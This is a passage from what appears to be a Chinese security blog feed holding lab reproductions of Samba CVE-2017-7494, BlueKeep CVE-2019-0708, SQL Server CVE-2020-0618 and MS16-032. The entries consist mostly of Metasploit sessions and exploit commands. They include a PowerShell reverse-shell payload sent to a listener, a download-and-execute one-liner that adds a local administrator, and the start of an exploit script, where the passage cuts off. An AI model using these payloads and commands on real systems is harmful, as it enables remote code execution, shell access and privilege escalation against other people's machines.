class="line"></span><br><span class="line">[*] Starting persistent handler(s)...</span><br><span class="line">msf5 &gt; search CVE-2017-7494</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                   Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                   ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/linux/samba/is_known_pipename  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/linux/samba/is_known_pipename </span><br><span class="line">[*] No payload configured, defaulting to cmd/unix/interact</span><br><span class="line">msf5 exploit(linux/samba/is_known_pipename) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/is_known_pipename):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT           445              yes       The SMB service port (TCP)</span><br><span class="line">   SMB_FOLDER                       no        The directory to use within the writeable SMB share</span><br><span class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/interact):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (Interact)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/samba/is_known_pipename) &gt; <span class="built_in">set</span> rhosts 192.168.77.211</span><br><span class="line">rhosts =&gt; 192.168.77.211</span><br><span class="line">msf5 exploit(linux/samba/is_known_pipename) &gt; <span class="built_in">set</span> rport 37483</span><br><span class="line">rport =&gt; 37483</span><br><span class="line">msf5 exploit(linux/samba/is_known_pipename) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.77.211:37483 - Using location \\192.168.77.211\share\ <span class="keyword">for</span> the path</span><br><span class="line">[*] 192.168.77.211:37483 - Retrieving the remote path of the share <span class="string">&#x27;share&#x27;</span></span><br><span class="line">[*] 192.168.77.211:37483 - Share <span class="string">&#x27;share&#x27;</span> has server-side path <span class="string">&#x27;/tmp/</span></span><br><span class="line"><span class="string">[*] 192.168.77.211:37483 - Uploaded payload to \\192.168.77.211\share\afvoZDYY.so</span></span><br><span class="line"><span class="string">[*] 192.168.77.211:37483 - Loading the payload from server-side path /tmp/afvoZDYY.so using \\PIPE\/tmp/afvoZDYY.so...</span></span><br><span class="line"><span class="string">[-] 192.168.77.211:37483 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span></span><br><span class="line"><span class="string">[*] 192.168.77.211:37483 - Loading the payload from server-side path /tmp/afvoZDYY.so using /tmp/afvoZDYY.so...</span></span><br><span class="line"><span class="string">[+] 192.168.77.211:37483 - Probe response indicates the interactive payload was loaded...</span></span><br><span class="line"><span class="string">[*] Found shell.</span></span><br><span class="line"><span class="string">[*] Command shell session 1 opened (0.0.0.0:0 -&gt; 192.168.77.211:37483) at 2021-11-12 01:12:09 -0500</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">flag-&#123;bmhb65f3024-ff71-45ce-9d8d-9adb0676081a&#125;</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112151042700.png" alt="image-20211112151042700"></p>
]]></content>
      <categories>
        <category>主机安全</category>
      </categories>
  </entry>
  <entry>
    <title>远程桌面远程执行漏洞(CVE-2019-0708)</title>
    <url>/2021/11/05/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2019-0708)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>当未经身份验证的攻击者使用 RDP 连接到目标系统并发送经特殊设计的请求时，远程桌面服务（以前称为“终端服务”）中存在远程执行代码漏洞。此漏洞是预身份验证，无需用户交互。</p>
<p>参考：<a href="https://www.hackliu.com/?p=468">https://www.hackliu.com/?p=468</a></p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>Windows 7<br>Windows server 2008 R2<br>Windows server 2008<br>Windows 2003<br>Windows xp</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：kali 2021.1</p>
<p>受害机：Windows 7</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="载入载荷"><a href="#载入载荷" class="headerlink" title="载入载荷"></a>载入载荷</h3><p>更新msf;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>

<p>下载攻击套件;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gitee.com/cat-nineteen/tools/blob/master/tools/msftools/CVE-2019-0708RDP.zip</span><br></pre></td></tr></table></figure>

<p>替换msf中相应的文件;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211105140429155.png" alt="image-20211105140429155"></p>
<p>启动msf;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动时报错信息如下：</span></span><br><span class="line">root@kali:/opt/tools/msftools/CVE-2019-0708RDP<span class="comment"># msfconsole </span></span><br><span class="line">Unable to find a spec satisfying metasploit-framework (&gt;= 0) <span class="keyword">in</span> the <span class="built_in">set</span>. Perhaps the lockfile is corrupted?</span><br><span class="line">Run `bundle install` to install missing gems.</span><br></pre></td></tr></table></figure>

<p>使用reload_all加载payload文件；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure>

<p>搜索2019_0708，可以看到文件成功加载；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search 2019_0708</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211105140914488.png" alt="image-20211105140914488"></p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>使用扫描模块（scanner）;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use  auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; <span class="built_in">set</span> rhost 192.168.220.130</span><br><span class="line">rhost =&gt; 192.168.220.130</span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random</span><br><span class="line">   RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">   RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">   RHOSTS           192.168.220.130  yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT            3389             yes       The target port (TCP)</span><br><span class="line">   THREADS          1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name  Description</span><br><span class="line">   ----  -----------</span><br><span class="line">   Scan  Scan <span class="keyword">for</span> exploitable targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.220.130:3389  - Detected RDP on 192.168.220.130:3389  (Windows version: 6.1.7601) (Requires NLA: No)</span><br><span class="line">[+] 192.168.220.130:3389  - The target is vulnerable.</span><br><span class="line">[*] 192.168.220.130:3389  - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line"><span class="comment"># The target is vulnerable，证明目标主机存在0708漏洞</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211105141241472.png" alt="image-20211105141241472"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> rhost 192.168.220.130</span><br><span class="line">rhost =&gt; 192.168.220.130</span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> rport 3389</span><br><span class="line">rport =&gt; 3389</span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> target 4</span><br><span class="line">target =&gt; 4</span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random</span><br><span class="line">   RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">   RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">   RHOSTS           192.168.220.130  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT            3389             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.220.139  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic targeting via fingerprinting</span><br><span class="line">   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)</span><br><span class="line">   2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)</span><br><span class="line">   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)</span><br><span class="line">   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)</span><br><span class="line">   5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)</span><br><span class="line">   6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)</span><br><span class="line">   7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)</span><br><span class="line">   8   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.220.139:4444 </span><br><span class="line">[*] 192.168.220.130:3389 - Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to <span class="built_in">disable</span>)</span><br><span class="line">[*] 192.168.220.130:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check</span><br><span class="line">[+] 192.168.220.130:3389  - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.</span><br><span class="line">[*] 192.168.220.130:3389  - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.220.130:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.</span><br><span class="line">[*] 192.168.220.130:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028600000, Channel count 1.</span><br><span class="line">[!] 192.168.220.130:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.220.130:3389 - Surfing channels ...</span><br><span class="line">[*] 192.168.220.130:3389 - Lobbing eggs ...</span><br><span class="line">[*] 192.168.220.130:3389 - Forcing the USE of FREE<span class="string">&#x27;d object ...</span></span><br></pre></td></tr></table></figure>

<p>还是没成功获取shell。</p>
]]></content>
      <categories>
        <category>主机安全</category>
      </categories>
  </entry>
  <entry>
    <title>SQLServer远程代码执行漏洞(CVE-2020-0618)</title>
    <url>/2021/11/15/SQLServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-0618)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>SQL Server 是Microsoft 开发的一个关系数据库管理系统(RDBMS)，是现在世界上广泛使用的数据库之一。</p>
<p>低权限的攻击者向有漏洞版本的SQL Server的Reporting Services实例发送精心构造的payload请求，可利用此漏洞在报表服务器服务帐户的上下文中执行任意代码，即可实现getshell。</p>
<p>参考：<a href="https://blog.csdn.net/weixin_45006525/article/details/116147471">https://blog.csdn.net/weixin_45006525/article/details/116147471</a></p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>SQL Server 2012 for 32-bit Systems Service Pack 4 (QFE)<br>SQL Server 2012 for x64-based Systems Service Pack 4 (QFE)<br>SQL Server 2014 Service Pack 3 for 32-bit Systems (CU)<br>SQL Server 2014 Service Pack 3 for 32-bit Systems (GDR)<br>SQL Server 2014 Service Pack 3 for x64-based Systems (CU)<br>SQL Server 2014 Service Pack 3 for x64-based Systems (GDR)<br>SQL Server 2016 for x64-based Systems Service Pack 1<br>SQL Server 2016 for x64-based Systems Service Pack 2 (CU)<br>SQL Server 2016 for x64-based Systems Service Pack 2 (GDR)</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="windows搭建"><a href="#windows搭建" class="headerlink" title="windows搭建"></a>windows搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、Windows Server 2016 Datacenter（https://msdn.itellyou.cn/）</span><br><span class="line">迅雷下载：</span><br><span class="line">ed2k://|file|cn_windows_server_2016_x64_dvd_9718765.iso|6176450560|CF1B73D220F1160DE850D9E1979DBD50|/</span><br><span class="line"></span><br><span class="line">2、SQL Server 2016 Developer Edition x64（https://msdn.itellyou.cn/）</span><br><span class="line">迅雷下载：</span><br><span class="line">ed2k://|file|cn_sql_server_2016_enterprise_with_service_pack_1_x64_dvd_9538279.iso|2959722496|E3F5E07B85F0AB42CA115CE1D6CA27D1|/</span><br><span class="line"></span><br><span class="line">3、下载Postman-win64-7.22.1（https://www.postman.com/）</span><br><span class="line"></span><br><span class="line">4、下载ysoserial</span><br><span class="line">https://github.com/pwntester/ysoserial.net/releases/download/v1.34/ysoserial-1.34.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115193548769.png" alt="image-20211115193548769"></p>
<p><strong>SQL Server 2016安装</strong></p>
<ul>
<li>虚拟机挂载sqlserver.iso镜像文件</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115145241441.png" alt="image-20211115145241441"></p>
<ul>
<li>双击安装程序；</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115145423994.png" alt="image-20211115145423994"></p>
<ul>
<li>安装选择第一个，向现有安装添加功能；</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115143849650.png" alt="image-20211115143849650"></p>
<ul>
<li>一路默认安装。</li>
<li>到“功能选择”的时候,选择“数据库引擎服务”和“Reporting Services本机”；</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115144058545.png" alt="image-20211115144058545"></p>
<ul>
<li><p>一路选择“下一步”。</p>
</li>
<li><p>用混合模式创建账号 账号sa,密码输入符合复杂度的即可。并且添加当前账户;</p>
</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115144438970.png" alt="image-20211115144438970"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115144539895.png" alt="image-20211115144539895"></p>
<ul>
<li><p>一路选择“下一步”，直到安装完成即可。</p>
</li>
<li><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115150413999.png" alt="image-20211115150413999"></p>
</li>
</ul>
<p>访问 <a href="http://localhost/ReportS/browse/%EF%BC%8C%E4%B8%8B%E5%9B%BE%E4%BB%A3%E8%A1%A8%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F%E3%80%82">http://localhost/ReportS/browse/，下图代表安装成功。</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115151056257.png" alt="image-20211115151056257"></p>
<p><strong>创建分页报表</strong></p>
<ul>
<li>访问：<a href="http://localhost/ReportS/browse/">http://localhost/ReportS/browse/</a> 点击分页报表</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115174849682.png" alt="image-20211115174849682"></p>
<ul>
<li>安装报表服务器，<a href="https://www.microsoft.com/en-us/download/details.aspx?id=53613">点我下载</a>，或者按如下页面点击下载;</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175017110.png" alt="image-20211115175017110"></p>
<ul>
<li>打开报表服务。刷新页面，重新点击“分页报表”。点击浏览器的弹窗；</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175204991.png" alt="image-20211115175204991"></p>
<ul>
<li>新建一个报表；</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175333893.png"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175403988.png" alt="image-20211115175403988"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175446085.png" alt="image-20211115175446085"></p>
<p>点击凭据，选择次用户名和密码，输入创建的用户名“sa”以及“密码”;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175511944.png" alt="image-20211115175511944"></p>
<ul>
<li>创建视图</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175541795.png" alt="image-20211115175541795"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175559595.png" alt="image-20211115175559595"></p>
<ul>
<li>访问创建的视图;</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175846661.png" alt="image-20211115175846661"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul>
<li><p>生成payload：</p>
<p>在powershell中运行下面四条命令，<strong>运行完成后payload自动在剪切板中。粘贴到文档即可</strong>。</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;本人用kali（kali-ip）&quot;,2333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  =$sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">.\ysoserial.exe <span class="literal">-g</span> TypeConfuseDelegate <span class="operator">-f</span> LosFormatter <span class="literal">-c</span> <span class="string">&quot;powershell.exe -encodedCommand <span class="variable">$encodedCommand</span>&quot;</span> <span class="literal">-o</span> base64 | clip</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175923170.png" alt="image-20211115175923170"></p>
<p>将剪贴板的payload粘贴到文本中；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115180008545.png" alt="image-20211115180008545"></p>
<ul>
<li>kali监听相应端口</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>

<ul>
<li>安装并启用postman，发送post包，具体步骤如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># post请求地址：http://localhost/ReportServer/Pages/ReportViewer.aspx</span><br><span class="line"></span><br><span class="line"># type选择NTLM模式</span><br><span class="line"></span><br><span class="line"># 填入服务器的用户名（username）和密码(password)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115173000885.png" alt="image-20211115173000885"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Body中填入键值对</span><br><span class="line">NavigationCorrector$PageState=NeedsCorrection</span><br><span class="line">NavigationCorrector$ViewState=payload</span><br><span class="line">__VIEWSTATE=</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115172742359.png" alt="image-20211115172742359"></p>
<ul>
<li>点击发送；</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115180606134.png" alt="image-20211115180606134"></p>
<ul>
<li>nc已经成功收到反连shell；</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115180739356.png" alt="image-20211115180739356"></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>目前微软官方已针对受支持的版本发布了修复该漏洞的安全补丁，请受影响的用户尽快安装补丁进行防护。</p>
<p>官方下载链接：<a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618">https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>MS16_032系统提权漏洞</title>
    <url>/2021/11/18/MS16_032%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>MS16_032系统提权漏洞。</p>
<p>参考：<a href="https://blog.csdn.net/Adminxe/article/details/106754010">https://blog.csdn.net/Adminxe/article/details/106754010</a></p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>此漏洞会影响以下Microsoft产品：</p>
<ul>
<li>Windows Vista </li>
<li>Windows 7</li>
<li>Windows 8.1</li>
<li>Windows 10 </li>
<li>Windows 2008 Server </li>
<li>Windows 2012 Server</li>
</ul>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：kali</p>
<p>受害机：Windows 7(需要配置两个以上处理器)</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211118185711963.png" alt="image-20211118185711963"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>使用powershell一句话提权;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#x27;);Invoke-MS16-032 -Application cmd.exe -commandline &#x27;/c net localgroup administrators longer /add&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211118190845785.png" alt="image-20211118190845785"></p>
<p>GitHub的链接极其不稳定，可以将<a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1">POC</a>下载下来，将以下内容保存为<code>Invoke-MS16-032.ps1</code>文件；</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-MS16-032</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    PowerShell implementation of MS16-032. The exploit targets all vulnerable</span></span><br><span class="line"><span class="comment">    operating systems that support PowerShell v2+. Credit for the discovery of</span></span><br><span class="line"><span class="comment">    the bug and the logic to exploit it go to James Forshaw (@tiraniddo).</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Targets:</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    * Win7-Win10 &amp; 2k8-2k12 &lt;== 32/64 bit!</span></span><br><span class="line"><span class="comment">    * Tested on x32 Win7, x64 Win8, x64 2k12R2</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Notes:</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    * In order for the race condition to succeed the machine must have 2+ CPU</span></span><br><span class="line"><span class="comment">      cores. If testing in a VM just make sure to add a core if needed mkay.</span></span><br><span class="line"><span class="comment">    * The exploit is pretty reliable, however ~1/6 times it will say it succeeded</span></span><br><span 